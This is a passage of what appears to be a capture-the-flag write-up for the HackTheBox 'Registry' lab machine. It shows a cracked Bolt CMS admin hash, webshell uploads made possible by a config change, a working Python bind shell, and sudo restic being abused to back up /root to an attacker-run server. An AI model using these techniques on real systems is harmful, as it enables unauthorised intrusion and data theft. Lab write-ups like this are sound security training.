<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ ssh -v -i id_rsa bolt@registry.htb</span><br><span class="line">OpenSSH_8.1p1 Debian-1, OpenSSL 1.1.1d  10 Sep 2019</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to registry.htb [10.10.10.159] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> 0</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.1p1 Debian-1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to registry.htb:22 as <span class="string">'bolt'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs</span><br><span class="line">debug1: Host <span class="string">'registry.htb'</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:5</span><br><span class="line">debug1: rekey out after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering public key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">debug1: Server accepts key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>: </span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to registry.htb ([10.10.10.159]:22).</span><br><span class="line">debug1: channel 0: new [client-session]</span><br><span class="line">debug1: Requesting no-more-sessions@openssh.com</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: pledge: network</span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LANG = en_US.utf8</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr  4 01:14:31 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 39%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    163</span><br><span class="line">Last login: Sat Apr  4 00:57:04 2020 from 10.10.15.8</span><br><span class="line">bolt@bolt:~$ whoami &amp; hostname</span><br><span class="line">[1] 6324</span><br><span class="line">bolt</span><br><span class="line">bolt</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure>

<p>and Finally i can now get the <code>user.txt</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr  4 01:14:31 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 39%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    163</span><br><span class="line">Last login: Sat Apr  4 00:57:04 2020 from 10.10.15.8</span><br><span class="line">bolt@bolt:~$ whoami &amp; hostname</span><br><span class="line">[1] 6324</span><br><span class="line">bolt</span><br><span class="line">bolt</span><br><span class="line">bolt@bolt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">[1]+  Done                    whoami</span><br><span class="line">bolt@bolt:~$ cat user.txt</span><br><span class="line">ytc0y[-----------------------]3ywzi</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>So it‚Äôs time to do enumeration again the <code>bolt user shell</code>, I tried <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">LinPEAS</a> to enumerate the shell, then I found out that there was a CMS installed in the machine which is <code>&quot;Bolt CMS&quot;</code></p>
<p>wget, curl was not working, so I try <strong><em>netcat</em></strong> to transfer the <code>linpeash.sh</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># on my registry machine (the receiver)</span></span><br><span class="line">bolt@bolt:/tmp$ nc -l -p 1234 &gt; linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># and on my kali linux machine (the sender)</span></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker</span><br><span class="line">‚ùØ nc -w 3 10.10.10.159 1234 &lt; linpeas.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># run linpeas on registry</span></span><br><span class="line">bolt@bolt:/tmp$ chmod +x linpeas.sh</span><br><span class="line">bolt@bolt:/tmp$ bash linpeas.sh</span><br></pre></td></tr></table></figure>

<h3 id="Registry-Basic-Information"><a href="#Registry-Basic-Information" class="headerlink" title="Registry Basic Information"></a>Registry Basic Information</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">====================================( Basic information )=====================================</span><br><span class="line">OS: Linux version <span class="number">4.15</span><span class="number">.0</span><span class="number">-65</span>-generic (buildd@lgw01-amd64<span class="number">-006</span>) (gcc version <span class="number">7.4</span><span class="number">.0</span> (Ubuntu <span class="number">7.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">18.04</span><span class="number">.1</span>)) #<span class="number">74</span>-Ubuntu SMP Tue Sep <span class="number">17</span> <span class="number">17</span>:<span class="number">06</span>:<span class="number">04</span> UTC <span class="number">2019</span></span><br><span class="line">User &amp; Groups: uid=<span class="number">1001</span>(bolt) gid=<span class="number">1001</span>(bolt) groups=<span class="number">1001</span>(bolt)</span><br><span class="line">Hostname: bolt</span><br><span class="line">Writable folder: /dev/shm</span><br><span class="line">[+] /bin/ping is <span class="built_in">available</span> <span class="keyword">for</span> network discovery (linpeas can discover hosts, learn more with -h)</span><br><span class="line">[+] /bin/nc is <span class="built_in">available</span> <span class="keyword">for</span> network discover &amp; port scanning (linpeas can discover hosts <span class="keyword">and</span> scan ports, learn more with -h)</span><br><span class="line">[+] nmap is <span class="built_in">available</span> <span class="keyword">for</span> network discover &amp; port scanning, you should use it yourself</span><br></pre></td></tr></table></figure>

<h3 id="BOLT-CMS-WEBSITE"><a href="#BOLT-CMS-WEBSITE" class="headerlink" title="BOLT CMS WEBSITE"></a>BOLT CMS WEBSITE</h3><p>Going deep of recon I see <code>db.sqlite</code> which contains a password hash, and installed CMS Website at <code>/var/www/html</code> directory.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">[+] Looking <span class="keyword">for</span> tables inside readable .db/.<span class="function">sqlite <span class="title">files</span> <span class="params">(limit <span class="number">100</span>)</span></span></span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/vendor/codeception/codeception/tests/data/sqlite.db (limit 20)                                                                               </span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db (limit <span class="number">20</span>)                                                                                           </span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_authtoken</span> <span class="params">(output limit <span class="number">10</span>)</span>                                                                                                               </span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_authtoken</span> <span class="params">(id INTEGER NOT <span class="literal">NULL</span>, user_id INTEGER <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, token VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, salt VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, ip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, useragent VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, validity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, PRIMARY KEY(id))</span></span></span><br><span class="line">  --&gt; Found for interesting column names in bolt_users (output limit 10)</span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_users</span> <span class="params">(id INTEGER NOT <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, password VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, email VARCHAR(<span class="number">254</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, lastip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, displayname VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, <span class="built_in">stack</span> CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, enabled BOOLEAN <span class="literal">DEFAULT</span> <span class="string">'1'</span> NOT <span class="literal">NULL</span>, shadowpassword VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowtoken VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowvalidity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, failedlogins INTEGER <span class="literal">DEFAULT</span> <span class="number">0</span> NOT <span class="literal">NULL</span>, throttleduntil DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, roles CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, PRIMARY KEY(id))</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/app/database/bolt.db (limit 20)</span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_authtoken</span> <span class="params">(output limit <span class="number">10</span>)</span>                                                                                                               </span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_authtoken</span> <span class="params">(id INTEGER PRIMARY KEY AUTOINCREMENT NOT <span class="literal">NULL</span>, user_id INTEGER <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, token VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, salt VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, ip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, useragent VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, validity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>)</span></span></span><br><span class="line">9, 1, None, 2e3f688aab59a4586f54fbd3f284eb3b941b0580142356d840c7e582801b6388, 33aa58459b97be252a29fd98e3cdf81b, 2020-04-04 18:48:37, 10.10.15.104, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0, 2020-04-18 18:48:37</span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_users</span> <span class="params">(output limit <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_users</span> <span class="params">(id INTEGER PRIMARY KEY AUTOINCREMENT NOT <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, password VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, email VARCHAR(<span class="number">254</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, lastip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, displayname VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, <span class="built_in">stack</span> CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, enabled BOOLEAN <span class="literal">DEFAULT</span> <span class="string">'1'</span> NOT <span class="literal">NULL</span>, shadowpassword VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowtoken VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowvalidity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, failedlogins INTEGER <span class="literal">DEFAULT</span> <span class="number">0</span> NOT <span class="literal">NULL</span>, throttleduntil DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, roles CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line">1, admin, $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK, bolt@registry.htb, 2020-04-04 22:00:22, 10.10.15.139, Admin, ["files://lass.php"], 1, None, None, None, 0, None, ["root","everyone"]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Web files?(output limit)</span><br><span class="line">/var/www/:                                                                                                                                                                                 </span><br><span class="line">total <span class="number">16</span>K</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> root     root     <span class="number">4.0</span>K May <span class="number">26</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">14</span> root     root     <span class="number">4.0</span>K May <span class="number">19</span>  <span class="number">2019</span> ..</span><br><span class="line">drwx------  <span class="number">3</span> root     root     <span class="number">4.0</span>K May <span class="number">26</span>  <span class="number">2019</span> .cache</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> www-data www-data <span class="number">4.0</span>K Apr  <span class="number">4</span> <span class="number">22</span>:<span class="number">01</span> html</span><br><span class="line"></span><br><span class="line">/var/www/html:</span><br><span class="line">total <span class="number">32</span>K</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> www-data www-data <span class="number">4.0</span>K Apr  <span class="number">4</span> <span class="number">22</span>:<span class="number">01</span> .</span><br></pre></td></tr></table></figure>

<p>I visited the bolt website at <code>registry.htb/bolt</code></p>
<p><img src="/img/registry/registry-bolt-page.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>Then I decrypt the password hasha using <a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John The Ripper</a> so:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ john bolt-hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using <span class="keyword">default</span> input encoding: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="function">password <span class="title">hash</span> (<span class="params">bcrypt [Blowfish <span class="number">32</span>/<span class="number">64</span> X3]</span>)</span></span><br><span class="line"><span class="function">Cost 1 (<span class="params">iteration count</span>) <span class="keyword">is</span> 1024 <span class="keyword">for</span> all loaded hashes</span></span><br><span class="line"><span class="function">Will run 4 OpenMP threads</span></span><br><span class="line"><span class="function">Press 'q' or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span></span><br><span class="line"><span class="function"><span class="title">strawberry</span>       (<span class="params">admin</span>)</span></span><br><span class="line"><span class="function">1g 0:00:00:05 <span class="title">DONE</span> (<span class="params"><span class="number">2020</span><span class="number">-04</span><span class="number">-05</span> <span class="number">06</span>:<span class="number">54</span></span>) 0.1996g/s 71.85p/s 71.85c/s 71.85C/s strawberry..brianna</span></span><br><span class="line"><span class="function">Use the "--show" option to display all of the cracked passwords reliably</span></span><br><span class="line"><span class="function">Session completed</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 took 9s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure>

<p>after only 9 seconds i get the password <strong><em>strawberry</em></strong> and login this into Bolt CMS</p>
<p><strong>BOLT CMS LOGIN PAGE</strong></p>
<p><img src="/img/registry/registry-bolt-login.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>After login it display the dashboard which has a lot of stuffs.</p>
<p><strong>BOLT CMS DASHBOARD PAGE</strong></p>
<p><img src="/img/registry/registry-dashboard.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>I search on the bolt cms exploit and I found this <a href="https://fgsec.net/from-csrf-to-rce-bolt-cms/" target="_blank" rel="noopener">article</a> it is the same version on the bolt cms installed on the registry machine.</p>
<p>I tried to follow the exploitation but it doesn‚Äôt work. Also this part was really hard because theres a cron job inside that will erase everything you modified to I need to be fast as much.</p>
<p>So this is the default <code>Config.yml</code> in Bolt CMS Configuration where you can edit <code>accept_file_types</code>.</p>
<p><img src="/img/registry/registry-config-default.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>In the configuration file i‚Äôll put <code>php</code>, and <code>py</code> extensions so I can upload my webshells. Why I need to upload 2 different file ? <strong><em>PHP Reverse Shell</em></strong> is not working so I search for other webshell that I can execute and get remote inside on the webserver.</p>
<p><img src="/img/registry/registry-config-edited.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>Until i found out that I can use <code>Bind Shell</code> go gain remote shell. So I created my simple <strong><em>bind shell</em></strong> with python. this is similar to this <a href="https://github.com/Andhrimnirr/Python-Reverse-Bind-Shell" target="_blank" rel="noopener">one</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: nc -v &lt;ipaddress&gt; 9001 in the attacker machine to connect to the shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">9001</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">''</span>, PORT))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">(rem, addr) = s.accept()</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(rem.fileno(),<span class="number">2</span>)</span><br><span class="line">os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">pty.spawn(<span class="string">"/bin/bash"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>save it ! then I used <a href="https://cybarrior.com/blog/2019/05/09/p0wnyshell/" target="_blank" rel="noopener">p0wnyShell</a> so I can run the bind shell (<code>shell.py</code>) and connect it with my Kali Linux so. after done setting up I‚Äô uploaded it into <strong>File Management</strong> inside the Bolt CMS.</p>
<p><img src="/img/registry/registry-uploaded.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>now I will open the <code>p0wnyshell</code> and run the <code>shell.py</code></p>
<p><img src="/img/registry/registry-pownyshell.png" alt="HackTheBox-Registry" title="Registry BOLT CMS"></p>
<p>You will see that the port is in already in use but it‚Äôs okay I can still connect with my Kali Linux, and Now I‚Äôm on the shell of <code>www-data</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/Registry via üêò v7<span class="number">.3</span><span class="number">.15</span> via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ nc -v <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> <span class="number">9001</span></span><br><span class="line">registry.htb [<span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>] <span class="number">9001</span> (?) <span class="built_in">open</span></span><br><span class="line">www-data@bolt:~/html/bolt/files$ ls</span><br><span class="line">ls</span><br><span class="line">www-data@bolt:~/html/bolt/files$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>As a <code>www-data</code> user we can restic <code>sudo</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">www-data@bolt:~/html/bolt/files$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bolt:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may <span class="built_in">run</span> the following commands on bolt:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/restic backup -r rest*</span><br><span class="line">www-data@bolt:~/html/bolt/files$</span><br></pre></td></tr></table></figure>

<p>So as we have privilege for running the restic we can get the root.</p>
<h3 id="RESTIC-BACKUP-PROGRAM"><a href="#RESTIC-BACKUP-PROGRAM" class="headerlink" title="RESTIC BACKUP PROGRAM"></a>RESTIC BACKUP PROGRAM</h3><p>So what is <strong>Restic</strong> ?<br>Restic is a backup program that is fast, efficient and secure. It supports the three major operating systems (Linux, macOS, Windows) and a few smaller ones (FreeBSD, OpenBSD).</p>
<p>Since we have privilege by running <code>restic</code> we can backup the <strong><em>root</em></strong> directory and get the administrator shell.</p>
<p>First I install restic into may Kali Linux.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">sudo apt-get install restic</span><br></pre></td></tr></table></figure>

<p>after the installation, I will create backup folder and set a password on that.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 4m1s </span><br><span class="line">‚ùØ mkdir backups</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ restic init -r ./backups/</span><br><span class="line">enter password <span class="keyword">for</span> new repository: </span><br><span class="line">enter password again: </span><br><span class="line">created restic repository 6f893c5da1 at ./backups/</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 13s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Looking at the <code>backups</code> directories</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 13s </span><br><span class="line">‚ùØ ls backups/</span><br><span class="line">config  data  index  keys  locks  snapshots</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<h3 id="SETTING-UP-THE-SERVER"><a href="#SETTING-UP-THE-SERVER" class="headerlink" title="SETTING UP THE SERVER"></a>SETTING UP THE SERVER</h3><p>Now I will install <code>docker</code> to my machine and start a server at port 8000</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<p>Now i will run restic server on my machine and set the path at <code>/backups</code> so:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ docker run -p 8000:8000 -v /root/htb/boxes/Registry/backups/:/backups -it restic/rest-server sh</span><br><span class="line">/ <span class="comment"># rest-server --path /backups</span></span><br><span class="line">rest-server 0.9.7 compiled with go1.10 on linux/amd64</span><br><span class="line">Data directory: /backups</span><br><span class="line">Authentication disabled</span><br><span class="line">Private repositories disabled</span><br><span class="line">Starting server on :8000</span><br></pre></td></tr></table></figure>

<p>after it‚Äôs successfully start the server we will go back the the <strong><em>bolt user shell</em></strong> and set <code>reverse SSH</code> so:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr  5 01:51:21 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 37%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   1%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    164</span><br><span class="line">Last login: Sun Apr  5 01:15:52 2020 from 10.10.15.43</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure>

<h3 id="CREATING-BACKUPS"><a href="#CREATING-BACKUPS" class="headerlink" title="CREATING BACKUPS"></a>CREATING BACKUPS</h3><p>Looks good ! Now I can create backups in <code>www-data</code>, I will choose to backup <code>/root/</code> folder because this what I need to ge the administrator so:</p>
